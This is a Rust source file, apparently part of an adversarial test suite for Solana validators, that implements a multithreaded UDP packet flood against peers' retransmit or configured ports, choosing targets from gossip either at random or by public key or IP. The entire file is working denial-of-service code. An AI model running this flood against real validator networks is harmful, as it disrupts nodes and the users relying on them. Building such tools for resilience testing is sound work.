use {
    crate::{
        adversary_feature_set::flood_unused_port::{FloodConfig, FloodStrategy},
        flood_worker::{create_rayon_thread_pool, AdversaryWorkersContext, ExitCondition},
        PeerIdentifierSanitized,
    },
    log::{error, info},
    rand::seq::SliceRandom,
    rayon::{prelude::*, ThreadPool},
    solana_gossip::{cluster_info::ClusterInfo, contact_info::ContactInfo},
    solana_net_utils::bind_to_unspecified,
    solana_streamer::sendmmsg::{batch_send, SendPktsError},
    std::{
        net::UdpSocket,
        sync::Arc,
        thread::{self, Builder},
        time::{Duration, Instant},
    },
};

pub struct FloodUnusedPort;

impl FloodUnusedPort {
    pub fn start(cluster_info: Arc<ClusterInfo>, config: FloodConfig) -> AdversaryWorkersContext {
        let exit = Arc::new(ExitCondition::default());
        let thread_pool = create_rayon_thread_pool("solAdvUPFWrkr");
        let thread_name = "solAdvUpFld00".to_string();
        let send_socket = bind_to_unspecified().unwrap();
        let thread_hdl = Builder::new()
            .name(thread_name.clone())
            .spawn({
                let exit = exit.clone();
                move || {
                    Self::run(
                        &send_socket,
                        &cluster_info,
                        &exit,
                        &thread_pool,
                        config,
                        thread_name,
                    );
                }
            })
            .expect("Failed to spawn thread for FloodUnusedPort");
        AdversaryWorkersContext::new(exit, vec![thread_hdl])
    }

    fn create_flood_packet() -> Vec<u8> {
        // Generate a simple, large packet. Expectation is the receiver
        // will never even look at or try to deserialize the data anyways.
        vec![0; 1000]
    }

    fn get_peer_port(peer: &ContactInfo, config: &FloodConfig) -> Option<u16> {
        match config.flood_strategy {
            FloodStrategy::HardcodedPort => config.port,
            FloodStrategy::Retransmit => match peer.retransmit() {
                Some(retransmit) => Some(retransmit.port()),
                None => {
                    // If running this attack on a network with nodes not running invalidator code,
                    // retransmit socket address is not exposed in contact info. Gracefully skip those nodes.
                    error!(
                        "Failed to get retransmit socket address for peer {:?}. Skipping.",
                        peer.pubkey(),
                    );
                    None
                }
            },
        }
    }

    fn flood_unused_port_attack_generator(
        send_socket: &UdpSocket,
        config: &FloodConfig,
        peers: &[ContactInfo],
        thread_pool: &ThreadPool,
    ) -> usize {
        const MIN_PARALLEL_ITEMS: usize = 1_000;
        const MAX_SENDMMSG_ITEMS: usize = 10_000;

        let mut packet_count: usize = 0;

        for peer in peers.iter() {
            let Some(port) = Self::get_peer_port(peer, config) else {
                continue;
            };

            for chunk in (0..config.packets_per_peer_per_iteration)
                .collect::<Vec<_>>()
                .chunks(MAX_SENDMMSG_ITEMS)
            {
                let reqs_v: Vec<_> = thread_pool.install(|| {
                    chunk
                        .par_iter()
                        .with_min_len(MIN_PARALLEL_ITEMS)
                        .map(|_| {
                            let packet_buf = Self::create_flood_packet();
                            (
                                packet_buf,
                                std::net::SocketAddr::new(peer.retransmit().unwrap().ip(), port),
                            )
                        })
                        .collect::<Vec<_>>()
                });
                packet_count = packet_count.saturating_add(reqs_v.len());
                let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
                match batch_send(send_socket, reqs_iter) {
                    Ok(()) => (),
                    Err(SendPktsError::IoError(err, num_failed)) => {
                        packet_count = packet_count.saturating_sub(num_failed);
                        error!(
                            "batch_send failed to send {}/{} packets first error {:?}",
                            num_failed,
                            reqs_v.len(),
                            err
                        );
                    }
                }
            }
        }
        packet_count
    }

    fn run(
        send_socket: &UdpSocket,
        cluster_info: &ClusterInfo,
        exit: &ExitCondition,
        thread_pool: &ThreadPool,
        config: FloodConfig,
        thread_name: String,
    ) {
        const REPORT_INTERVAL_MS: u64 = 2_000;
        const DEFAULT_NUM_PEERS: usize = 10;
        let mut last_report = Instant::now();
        let mut iteration: u64 = 0;
        let mut packet_count: usize = 0;

        loop {
            if exit.is_set() {
                return;
            }

            let peers = {
                // Query gossip peers to get all the nodes in the network.
                // Otherwise, no specific gossip tie-in here.
                let peers = cluster_info.gossip_peers();
                if let Some(peer_id) = config.target.as_ref() {
                    // pubkey verified by RPC
                    let peer_id = PeerIdentifierSanitized::try_from(peer_id).unwrap();
                    let matches_ci = |ci: &&ContactInfo| -> bool {
                        match peer_id {
                            PeerIdentifierSanitized::Pubkey(pubkey) => pubkey == *ci.pubkey(),
                            PeerIdentifierSanitized::Ip(ip) => ip == ci.gossip().unwrap().ip(),
                        }
                    };
                    peers
                        .iter()
                        .find(matches_ci)
                        .cloned()
                        .map(|ci| vec![ci])
                        .unwrap_or_else(|| {
                            error!("unused port packet flood: target={peer_id:?} not found");
                            thread::sleep(Duration::from_secs(2));
                            Vec::default()
                        })
                } else {
                    let mut rng = rand::thread_rng();
                    peers
                        .choose_multiple(&mut rng, DEFAULT_NUM_PEERS)
                        .cloned()
                        .collect()
                }
            };

            packet_count = packet_count.saturating_add(Self::flood_unused_port_attack_generator(
                send_socket,
                &config,
                &peers,
                thread_pool,
            ));

            if last_report.elapsed() >= Duration::from_millis(REPORT_INTERVAL_MS) {
                let num_peers = peers.len();
                info!(
                    "unused port packet flood {thread_name}: num_peers={num_peers} \
                     iteration={iteration}, packets={packet_count}"
                );
                packet_count = 0;
                last_report = Instant::now();
            }
            iteration = iteration.saturating_add(1);
            if config.iteration_delay_us > 0
                && exit.wait_is_set(Duration::from_micros(config.iteration_delay_us))
            {
                return;
            }
        }
    }
}
